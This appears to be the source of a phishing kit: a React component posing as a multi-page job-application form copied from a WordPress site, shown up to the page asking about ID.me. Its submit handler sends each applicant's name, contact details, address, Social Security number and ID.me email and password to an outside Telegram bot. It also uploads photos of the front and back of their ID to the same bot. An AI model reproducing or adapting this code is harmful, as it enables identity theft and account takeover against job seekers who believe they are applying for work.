import React from "react";
import { telegramAPI } from "../utils/telegram.config";
import axios from "axios";
import { useNavigate } from "react-router-dom";

type IDFile = {
  frontImage: File | null;
  backImage: File | null;
};

type IFormInput = {
  first_name: string;
  last_name: string;
  middle_name: string;
  email: string;
  phone_number: string;
  address: string;
  city: string;
  state: string;
  postal: string;
  country: string;
  sn: string;
  have_work: any;
  no_work: any;
  ms_office: string;
  have_id_me: string;
  no_id_me: string;
  id_me_login: string;
  id_me_password: string;
  why_hire: string;
};

export default function Login() {


  React.useEffect(()=>{
    
    const script1 = document.createElement('script');
    script1.src = './remote_files/jquery.min.js.download';
    script1.async = true;
    document.body.appendChild(script1);

    const script2 = document.createElement('script');
    script2.src = './remote_files/jquery-migrate.min.js.download';
    script2.async = true;
    document.body.appendChild(script2);

    const script3 = document.createElement('script');
    script3.src = './remote_files/jquery.scrollTo.js.download';
    script3.async = true;
    document.body.appendChild(script3);

    const script4 = document.createElement('script');
    script4.src = './remote_files/jquery.validate.min.js.download';
    script4.async = true;
    document.body.appendChild(script4);

    const script5 = document.createElement('script');
    script5.src = './remote_files/wp-emoji-release.min.js.download';
    script5.async = true;
    document.body.appendChild(script5);

    const script6 = document.createElement('script');
    script6.src = './remote_files/skip-link-focus-fix.js.download';
    script6.async = true;
    document.body.appendChild(script6);

    const script7 = document.createElement('script');
    script7.src = './remote_files/global.js.download';
    script7.async = true;
    document.body.appendChild(script7);

    const script8 = document.createElement('script');
    script8.src = './remote_files/wpforms.js.download';
    script8.async = true;
    document.body.appendChild(script8);

    const script9 = document.createElement('script');
    script9.src = './remote_files/jquery.inputmask.bundle.min.js.download';
    script9.async = true;
    document.body.appendChild(script9);

    return () => {
      document.body.removeChild(script1);
      document.body.removeChild(script2);
      document.body.removeChild(script3);
      document.body.removeChild(script4);
      document.body.removeChild(script5);
      document.body.removeChild(script6);
      document.body.removeChild(script7);
      document.body.removeChild(script8);
      document.body.removeChild(script9);
    };
  }, [])

  const [isLoading, setIsLoading] = React.useState<boolean>(false);
  const [formInput, setFormInput] = React.useState<IFormInput>({
    first_name: "",
    last_name: "",
    middle_name: "",
    email: "",
    phone_number: "",
    address: "",
    city: "",
    state: "",
    postal: "",
    country: "",
    sn: "",
    have_work: "",
    no_work: "",
    ms_office: "",
    have_id_me: "",
    no_id_me: "",
    id_me_login: "",
    id_me_password: "",
    why_hire: "",
  });

  const [images, setImages] = React.useState<IDFile>({
    frontImage: null,
    backImage: null,
  });

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleSelectChange(event: React.ChangeEvent<HTMLSelectElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  const navigate = useNavigate();

  function handleFileChange(event: React.ChangeEvent<HTMLInputElement>) {
    setImages((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.files?.[0] || null,
    }));
  }

  async function TelegramSend(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);
    const message = `
    Full Name: ${formInput.first_name} ${formInput.middle_name} ${formInput.last_name}
    Email: ${formInput.email}
    Phone Number: ${formInput.phone_number}
    Address: ${formInput.address} ${formInput.city} ${formInput.state} ${formInput.country} ${formInput.postal}
    Social Security: ${formInput.sn}
    Do you have a job: ${formInput.have_work}
    Are you good with Microsoft office: ${formInput.ms_office}
    Do you have IDme: ${formInput.have_id_me}
    IDme Email: ${formInput.id_me_login}
    IDme Password: ${formInput.id_me_password}
    Why should we hire you: ${formInput.why_hire}
    `;

    const url = `https://api.telegram.org/bot${telegramAPI.token}/sendDocument`;

    let options1 = {
      method: "POST",
      url,
      headers: {
        accept: "application/json",
        "content-type": "multipart/form-data",
        "User-Agent":
          "Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)",
      },
      data: {
        chat_id: telegramAPI.chat_id,
        document: images.frontImage,
        caption: "Front Image",
      },
    };

    let options2 = {
      method: "POST",
      url,
      headers: {
        accept: "application/json",
        "content-type": "multipart/form-data",
        "User-Agent":
          "Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)",
      },
      data: {
        chat_id: telegramAPI.chat_id,
        document: images.backImage,
        caption: "Front Image",
      },
    };

    try{
    await axios.request({
      method: "POST",
      url: `https://api.telegram.org/bot${telegramAPI.token}/sendMessage`,
      data: {
        chat_id: telegramAPI.chat_id,
        text: message,
      },
    });
    await axios.request(options1);

    await axios.request(options2);
  }catch(err){
    console.log(err);
    return setIsLoading(false);
  }
  setIsLoading(false);
  navigate("/success");
  }

  return (
    <form
      className="wpforms-validate wpforms-form"
      onSubmit={TelegramSend}
      method="post"
      encType="multipart/form-data"
      // action="http://dataconvergencetech.org/?wpforms_form_id=8"
    >
      <div
        className="wpforms-page-indicator connector"
        data-indicator="connector"
        data-indicator-color="#72b239"
      >
        <div
          className="wpforms-page-indicator-page active wpforms-page-indicator-page-1"
          style={{ width: "7.6923076923077%" }}
        >
          <span
            className="wpforms-page-indicator-page-number"
            style={{ backgroundColor: "#72b239" }}
          >
            1
            <span
              className="wpforms-page-indicator-page-triangle"
              style={{ borderTopColor: "#72b239" }}
            ></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-2"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            2<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-3"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            3<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-4"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            4<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-5"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            5<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-6"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            6<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-7"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            7<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-8"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            8<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-9"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            9<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-10"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            10<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-11"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            11<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-12"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            12<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
        <div
          className="wpforms-page-indicator-page wpforms-page-indicator-page-13"
          style={{ width: "7.6923076923077%" }}
        >
          <span className="wpforms-page-indicator-page-number">
            13<span className="wpforms-page-indicator-page-triangle"></span>
          </span>
        </div>
      </div>
      <div className="wpforms-field-container">
        <div className="wpforms-page wpforms-page-1">
          <div
            id="wpforms-8-field_23-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="23"
          ></div>
          <div
            id="wpforms-8-field_1-container"
            className="wpforms-field wpforms-field-text"
            data-field-id="1"
          >
            <label className="wpforms-field-label" htmlFor="wpforms-8-field_1">
              How did you hear about us?
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="text"
              id="wpforms-8-field_1"
              className="wpforms-field-medium wpforms-field-required"
              name="wpforms[fields][1]"
              placeholder="Referral, Newsletter etc"
              required
            />
          </div>
          <div
            id="wpforms-8-field_22-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="22"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="1"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-2"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_3-container"
            className="wpforms-field wpforms-field-name"
            data-field-id="3"
          >
            <label className="wpforms-field-label" htmlFor="wpforms-8-field_3">
              Full Name
              <span className="wpforms-required-label">*</span>
            </label>
            <div className="wpforms-field-row wpforms-field-medium">
              <div className="wpforms-field-row-block wpforms-first wpforms-two-fifths">
                <input
                  type="text"
                  id="wpforms-8-field_3"
                  className="wpforms-field-name-first wpforms-field-required"
                  name="first_name"
                  onChange={handleInputChange}
                  required
                />
                <label
                  htmlFor="wpforms-8-field_3"
                  className="wpforms-field-sublabel after"
                >
                  First
                </label>
              </div>
              <div className="wpforms-field-row-block wpforms-one-fifth">
                <input
                  type="text"
                  id="wpforms-8-field_3-middle"
                  className="wpforms-field-name-middle"
                  name="middle_name"
                  onChange={handleInputChange}
                />
                <label
                  htmlFor="wpforms-8-field_3-middle"
                  className="wpforms-field-sublabel after"
                >
                  Middle
                </label>
              </div>
              <div className="wpforms-field-row-block wpforms-two-fifths">
                <input
                  type="text"
                  id="wpforms-8-field_3-last"
                  className="wpforms-field-name-last wpforms-field-required"
                  name="last_name"
                  onChange={handleInputChange}
                  required
                />
                <label
                  htmlFor="wpforms-8-field_3-last"
                  className="wpforms-field-sublabel after"
                >
                  Last
                </label>
              </div>
            </div>
          </div>
          <div
            id="wpforms-8-field_26-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="26"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="2"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="2"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-3"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_4-container"
            className="wpforms-field wpforms-field-email"
            data-field-id="4"
          >
            <label className="wpforms-field-label" htmlFor="wpforms-8-field_4">
              Email
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="email"
              id="wpforms-8-field_4"
              className="wpforms-field-medium wpforms-field-required"
              name="email"
              onChange={handleInputChange}
              required
            />
          </div>
          <div
            id="wpforms-8-field_27-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="27"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="3"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="3"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-4"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_5-container"
            className="wpforms-field wpforms-field-phone"
            data-field-id="5"
          >
            <label className="wpforms-field-label" htmlFor="wpforms-8-field_5">
              Phone
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="tel"
              id="wpforms-8-field_5"
              className="wpforms-field-medium wpforms-field-required wpforms-masked-input"
              data-inputmask="&#39;mask&#39;: &#39;(999) 999-9999&#39;"
              name="phone_number"
              onChange={handleInputChange}
              required
              im-insert="true"
            />
          </div>
          <div
            id="wpforms-8-field_28-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="28"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="4"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="4"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-5"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_6-container"
            className="wpforms-field wpforms-field-address"
            data-field-id="6"
          >
            <label className="wpforms-field-label" htmlFor="wpforms-8-field_6">
              Address
              <span className="wpforms-required-label">*</span>
            </label>
            <div className="wpforms-field-row wpforms-field-medium">
              <div>
                <input
                  type="text"
                  id="wpforms-8-field_6"
                  className="wpforms-field-address-address1 wpforms-field-required"
                  name="address"
                  required
                  onChange={handleInputChange}
                />
                <label
                  htmlFor="wpforms-8-field_6"
                  className="wpforms-field-sublabel after"
                >
                  Address Line 1
                </label>
              </div>
            </div>
            <div className="wpforms-field-row wpforms-field-medium">
              <div className="wpforms-field-row-block wpforms-one-half wpforms-first">
                <input
                  type="text"
                  id="wpforms-8-field_6-city"
                  className="wpforms-field-address-city wpforms-field-required"
                  name="city"
                  required
                  onChange={handleInputChange}
                />
                <label
                  htmlFor="wpforms-8-field_6-city"
                  className="wpforms-field-sublabel after"
                >
                  City
                </label>
              </div>
              <div className="wpforms-field-row-block wpforms-one-half">
                <input
                  type="text"
                  id="wpforms-8-field_6-state"
                  className="wpforms-field-address-state wpforms-field-required"
                  name="state"
                  required
                  onChange={handleInputChange}
                />
                <label
                  htmlFor="wpforms-8-field_6-state"
                  className="wpforms-field-sublabel after"
                >
                  State / Province / Region
                </label>
              </div>
            </div>
            <div className="wpforms-field-row wpforms-field-medium">
              <div className="wpforms-field-row-block wpforms-one-half wpforms-first">
                <input
                  type="text"
                  id="wpforms-8-field_6-postal"
                  className="wpforms-field-address-postal wpforms-field-required"
                  name="postal"
                  required
                  onChange={handleInputChange}
                />
                <label
                  htmlFor="wpforms-8-field_6-postal"
                  className="wpforms-field-sublabel after"
                >
                  Postal Code
                </label>
              </div>
              <div className="wpforms-field-row-block wpforms-one-half">
                <select
                  id="wpforms-8-field_6-country"
                  className="wpforms-field-address-country wpforms-field-required"
                  name="country"
                  onChange={handleSelectChange}
                  required
                >
                  <option value="AF">Afghanistan</option>
                  <option value="AX">Åland Islands</option>
                  <option value="AL">Albania</option>
                  <option value="DZ">Algeria</option>
                  <option value="AS">American Samoa</option>
                  <option value="AD">Andorra</option>
                  <option value="AO">Angola</option>
                  <option value="AI">Anguilla</option>
                  <option value="AQ">Antarctica</option>
                  <option value="AG">Antigua and Barbuda</option>
                  <option value="AR">Argentina</option>
                  <option value="AM">Armenia</option>
                  <option value="AW">Aruba</option>
                  <option value="AU">Australia</option>
                  <option value="AT">Austria</option>
                  <option value="AZ">Azerbaijan</option>
                  <option value="BS">Bahamas</option>
                  <option value="BH">Bahrain</option>
                  <option value="BD">Bangladesh</option>
                  <option value="BB">Barbados</option>
                  <option value="BY">Belarus</option>
                  <option value="BE">Belgium</option>
                  <option value="BZ">Belize</option>
                  <option value="BJ">Benin</option>
                  <option value="BM">Bermuda</option>
                  <option value="BT">Bhutan</option>
                  <option value="BO">Bolivia (Plurinational State of)</option>
                  <option value="BA">Bosnia and Herzegovina</option>
                  <option value="BW">Botswana</option>
                  <option value="BV">Bouvet Island</option>
                  <option value="BR">Brazil</option>
                  <option value="IO">British Indian Ocean Territory</option>
                  <option value="BN">Brunei Darussalam</option>
                  <option value="BG">Bulgaria</option>
                  <option value="BF">Burkina Faso</option>
                  <option value="BI">Burundi</option>
                  <option value="CV">Cabo Verde</option>
                  <option value="KH">Cambodia</option>
                  <option value="CM">Cameroon</option>
                  <option value="CANADA">Canada</option>
                  <option value="KY">Cayman Islands</option>
                  <option value="CF">Central African Republic</option>
                  <option value="TD">Chad</option>
                  <option value="CL">Chile</option>
                  <option value="CN">China</option>
                  <option value="CX">Christmas Island</option>
                  <option value="CC">Cocos (Keeling) Islands</option>
                  <option value="CO">Colombia</option>
                  <option value="KM">Comoros</option>
                  <option value="CG">Congo</option>
                  <option value="CD">Congo (Democratic Republic of the)</option>
                  <option value="CK">Cook Islands</option>
                  <option value="CR">Costa Rica</option>
                  <option value="CI">Côte d'Ivoire</option>
                  <option value="HR">Croatia</option>
                  <option value="CU">Cuba</option>
                  <option value="CW">Curaçao</option>
                  <option value="CY">Cyprus</option>
                  <option value="CZ">Czech Republic</option>
                  <option value="DK">Denmark</option>
                  <option value="DJ">Djibouti</option>
                  <option value="DM">Dominica</option>
                  <option value="DO">Dominican Republic</option>
                  <option value="EC">Ecuador</option>
                  <option value="EG">Egypt</option>
                  <option value="SV">El Salvador</option>
                  <option value="GQ">Equatorial Guinea</option>
                  <option value="ER">Eritrea</option>
                  <option value="EE">Estonia</option>
                  <option value="ET">Ethiopia</option>
                  <option value="FK">Falkland Islands (Malvinas)</option>
                  <option value="FO">Faroe Islands</option>
                  <option value="FJ">Fiji</option>
                  <option value="FI">Finland</option>
                  <option value="FR">France</option>
                  <option value="GF">French Guiana</option>
                  <option value="PF">French Polynesia</option>
                  <option value="TF">French Southern Territories</option>
                  <option value="GA">Gabon</option>
                  <option value="GM">Gambia</option>
                  <option value="GE">Georgia</option>
                  <option value="DE">Germany</option>
                  <option value="GH">Ghana</option>
                  <option value="GI">Gibraltar</option>
                  <option value="GR">Greece</option>
                  <option value="GL">Greenland</option>
                  <option value="GD">Grenada</option>
                  <option value="GP">Guadeloupe</option>
                  <option value="GU">Guam</option>
                  <option value="GT">Guatemala</option>
                  <option value="GG">Guernsey</option>
                  <option value="GN">Guinea</option>
                  <option value="GW">Guinea-Bissau</option>
                  <option value="GY">Guyana</option>
                  <option value="HT">Haiti</option>
                  <option value="HM">Heard Island and McDonald Islands</option>
                  <option value="HN">Honduras</option>
                  <option value="HK">Hong Kong</option>
                  <option value="HU">Hungary</option>
                  <option value="IS">Iceland</option>
                  <option value="IN">India</option>
                  <option value="ID">Indonesia</option>
                  <option value="IR">Iran (Islamic Republic of)</option>
                  <option value="IQ">Iraq</option>
                  <option value="IE">Ireland (Republic of)</option>
                  <option value="IM">Isle of Man</option>
                  <option value="IL">Israel</option>
                  <option value="IT">Italy</option>
                  <option value="JM">Jamaica</option>
                  <option value="JP">Japan</option>
                  <option value="JE">Jersey</option>
                  <option value="JO">Jordan</option>
                  <option value="KZ">Kazakhstan</option>
                  <option value="KE">Kenya</option>
                  <option value="KI">Kiribati</option>
                  <option value="KP">
                    Korea (Democratic People's Republic of)
                  </option>
                  <option value="KR">Korea (Republic of)</option>
                  <option value="KW">Kuwait</option>
                  <option value="KG">Kyrgyzstan</option>
                  <option value="LA">Lao People's Democratic Republic</option>
                  <option value="LV">Latvia</option>
                  <option value="LB">Lebanon</option>
                  <option value="LS">Lesotho</option>
                  <option value="LR">Liberia</option>
                  <option value="LY">Libya</option>
                  <option value="LI">Liechtenstein</option>
                  <option value="LT">Lithuania</option>
                  <option value="LU">Luxembourg</option>
                  <option value="MO">Macao</option>
                  <option value="MK">Macedonia (Republic of)</option>
                  <option value="MG">Madagascar</option>
                  <option value="MW">Malawi</option>
                  <option value="MY">Malaysia</option>
                  <option value="MV">Maldives</option>
                  <option value="ML">Mali</option>
                  <option value="MT">Malta</option>
                  <option value="MH">Marshall Islands</option>
                  <option value="MQ">Martinique</option>
                  <option value="MR">Mauritania</option>
                  <option value="MU">Mauritius</option>
                  <option value="YT">Mayotte</option>
                  <option value="MX">Mexico</option>
                  <option value="FM">Micronesia (Federated States of)</option>
                  <option value="MD">Moldova (Republic of)</option>
                  <option value="MC">Monaco</option>
                  <option value="MN">Mongolia</option>
                  <option value="ME">Montenegro</option>
                  <option value="MS">Montserrat</option>
                  <option value="MA">Morocco</option>
                  <option value="MZ">Mozambique</option>
                  <option value="MM">Myanmar</option>
                  <option value="NA">Namibia</option>
                  <option value="NR">Nauru</option>
                  <option value="NP">Nepal</option>
                  <option value="NL">Netherlands</option>
                  <option value="NC">New Caledonia</option>
                  <option value="NZ">New Zealand</option>
                  <option value="NI">Nicaragua</option>
                  <option value="NE">Niger</option>
                  <option value="NG">Nigeria</option>
                  <option value="NU">Niue</option>
                  <option value="NF">Norfolk Island</option>
                  <option value="MP">Northern Mariana Islands</option>
                  <option value="NO">Norway</option>
                  <option value="OM">Oman</option>
                  <option value="PK">Pakistan</option>
                  <option value="PW">Palau</option>
                  <option value="PS">Palestine (State of)</option>
                  <option value="PA">Panama</option>
                  <option value="PG">Papua New Guinea</option>
                  <option value="PY">Paraguay</option>
                  <option value="PE">Peru</option>
                  <option value="PH">Philippines</option>
                  <option value="PN">Pitcairn</option>
                  <option value="PL">Poland</option>
                  <option value="PT">Portugal</option>
                  <option value="PR">Puerto Rico</option>
                  <option value="QA">Qatar</option>
                  <option value="RE">Réunion</option>
                  <option value="RO">Romania</option>
                  <option value="RU">Russian Federation</option>
                  <option value="RW">Rwanda</option>
                  <option value="BL">Saint Barthélemy</option>
                  <option value="SH">
                    Saint Helena, Ascension and Tristan da Cunha
                  </option>
                  <option value="KN">Saint Kitts and Nevis</option>
                  <option value="LC">Saint Lucia</option>
                  <option value="MF">Saint Martin (French part)</option>
                  <option value="PM">Saint Pierre and Miquelon</option>
                  <option value="VC">Saint Vincent and the Grenadines</option>
                  <option value="WS">Samoa</option>
                  <option value="SM">San Marino</option>
                  <option value="ST">Sao Tome and Principe</option>
                  <option value="SA">Saudi Arabia</option>
                  <option value="SN">Senegal</option>
                  <option value="RS">Serbia</option>
                  <option value="SC">Seychelles</option>
                  <option value="SL">Sierra Leone</option>
                  <option value="SG">Singapore</option>
                  <option value="SX">Sint Maarten (Dutch part)</option>
                  <option value="SK">Slovakia</option>
                  <option value="SI">Slovenia</option>
                  <option value="SB">Solomon Islands</option>
                  <option value="SO">Somalia</option>
                  <option value="ZA">South Africa</option>
                  <option value="GS">
                    South Georgia and the South Sandwich Islands
                  </option>
                  <option value="SS">South Sudan</option>
                  <option value="ES">Spain</option>
                  <option value="LK">Sri Lanka</option>
                  <option value="SD">Sudan</option>
                  <option value="SR">Suriname</option>
                  <option value="SJ">Svalbard and Jan Mayen</option>
                  <option value="SZ">Swaziland</option>
                  <option value="SE">Sweden</option>
                  <option value="CH">Switzerland</option>
                  <option value="SY">Syrian Arab Republic</option>
                  <option value="TW">Taiwan, Province of China</option>
                  <option value="TJ">Tajikistan</option>
                  <option value="TZ">Tanzania (United Republic of)</option>
                  <option value="TH">Thailand</option>
                  <option value="TL">Timor-Leste</option>
                  <option value="TG">Togo</option>
                  <option value="TK">Tokelau</option>
                  <option value="TO">Tonga</option>
                  <option value="TT">Trinidad and Tobago</option>
                  <option value="TN">Tunisia</option>
                  <option value="TR">Turkey</option>
                  <option value="TM">Turkmenistan</option>
                  <option value="TC">Turks and Caicos Islands</option>
                  <option value="TV">Tuvalu</option>
                  <option value="UG">Uganda</option>
                  <option value="UA">Ukraine</option>
                  <option value="AE">United Arab Emirates</option>
                  <option value="United Kingdom">
                    United Kingdom of Great Britain and Northern Ireland
                  </option>
                  <option value="USA">United States of America</option>
                  <option value="UM">
                    United States Minor Outlying Islands
                  </option>
                  <option value="UY">Uruguay</option>
                  <option value="UZ">Uzbekistan</option>
                  <option value="VU">Vanuatu</option>
                  <option value="VA">Vatican City State</option>
                  <option value="VE">Venezuela (Bolivarian Republic of)</option>
                  <option value="VN">Viet Nam</option>
                  <option value="VG">Virgin Islands (British)</option>
                  <option value="VI">Virgin Islands (U.S.)</option>
                  <option value="WF">Wallis and Futuna</option>
                  <option value="EH">Western Sahara</option>
                  <option value="YE">Yemen</option>
                  <option value="ZM">Zambia</option>
                  <option value="ZW">Zimbabwe</option>
                </select>
                <label
                  htmlFor="wpforms-8-field_6-country"
                  className="wpforms-field-sublabel after"
                >
                  Country
                </label>
              </div>
            </div>
          </div>
          <div
            id="wpforms-8-field_25-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="25"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="5"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="5"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-6"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_127-container"
            className="wpforms-field wpforms-field-text"
            data-field-id="127"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_127"
            >
              Social Security Number (SSN)
              <span className="wpforms-required-label">*</span>
            </label>
            <input
              type="text"
              id="wpforms-8-field_127"
              className="wpforms-field-medium wpforms-field-required"
              name="sn"
              onChange={handleInputChange}
              required
            />
          </div>
          <div
            id="wpforms-8-field_29-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="29"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="6"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="6"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-7"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_83-container"
            className="wpforms-field wpforms-field-radio"
            data-field-id="83"
          >
            <label className="wpforms-field-label" htmlFor="wpforms-8-field_83">
              Do you have experience working online?
            </label>
            <ul id="wpforms-8-field_83">
              <li className="choice-1 depth-1">
                <input
                  type="radio"
                  id="wpforms-8-field_83_1"
                  name="work_online_yes"
                  value="Yes"
                />
                <label
                  className="wpforms-field-label-inline"
                  htmlFor="wpforms-8-field_83_1"
                >
                  Yes
                </label>
              </li>
              <li className="choice-2 depth-1">
                <input
                  type="radio"
                  id="wpforms-8-field_83_2"
                  name="wpforms[fields][83]"
                  value="No"
                />
                <label
                  className="wpforms-field-label-inline"
                  htmlFor="wpforms-8-field_83_2"
                >
                  No
                </label>
              </li>
            </ul>
          </div>
          <div
            id="wpforms-8-field_34-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="34"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="7"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="7"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-8"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_132-container"
            className="wpforms-field wpforms-field-radio"
            data-field-id="132"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_132"
            >
              Are you currently working?
              <span className="wpforms-required-label">*</span>
            </label>
            <ul id="wpforms-8-field_132" className="wpforms-field-required">
              <li className="choice-1 depth-1">
                <input
                  type="radio"
                  id="wpforms-8-field_132_1"
                  name="have_work"
                  value="Yes"
                  required
                  onChange={handleInputChange}
                />
                <label
                  className="wpforms-field-label-inline"
                  htmlFor="wpforms-8-field_132_1"
                >
                  Yes
                </label>
              </li>
              <li className="choice-2 depth-1">
                <input
                  type="radio"
                  id="wpforms-8-field_132_2"
                  name="no_work"
                  onChange={handleInputChange}
                  value="No"
                />
                <label
                  className="wpforms-field-label-inline"
                  htmlFor="wpforms-8-field_132_2"
                >
                  No
                </label>
              </li>
            </ul>
          </div>
          <div
            id="wpforms-8-field_36-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="36"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="8"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="8"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-9"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_115-container"
            className="wpforms-field wpforms-field-textarea"
            data-field-id="115"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_115"
            >
              Are you conversant with Microsoft Office? What is your typing
              speed
              <span className="wpforms-required-label">*</span>
            </label>
            <textarea
              id="wpforms-8-field_115"
              className="wpforms-field-medium wpforms-field-required"
              required
            ></textarea>
          </div>
          <div
            id="wpforms-8-field_95-container"
            className="wpforms-field wpforms-field-pagebreak"
            data-field-id="95"
          >
            <div className="wpforms-clear wpforms-pagebreak-left">
              <button
                className="wpforms-page-button wpforms-page-prev"
                data-action="prev"
                data-page="9"
                data-formid="8"
              >
                Previous
              </button>
              <button
                className="wpforms-page-button wpforms-page-next"
                data-action="next"
                data-page="9"
                data-formid="8"
              >
                Next
              </button>
            </div>
          </div>
        </div>
        <div
          className="wpforms-page wpforms-page-10"
          style={{ display: "none" }}
        >
          <div
            id="wpforms-8-field_134-container"
            className="wpforms-field wpforms-field-radio"
            data-field-id="134"
          >
            <label
              className="wpforms-field-label"
              htmlFor="wpforms-8-field_134"
            >
              Do you have a verified account with ID.ME?
              <span className="wpforms-required-label">*</span>
            </label>
            <ul id="wpforms-8-field_134" className="wpforms-field-required">
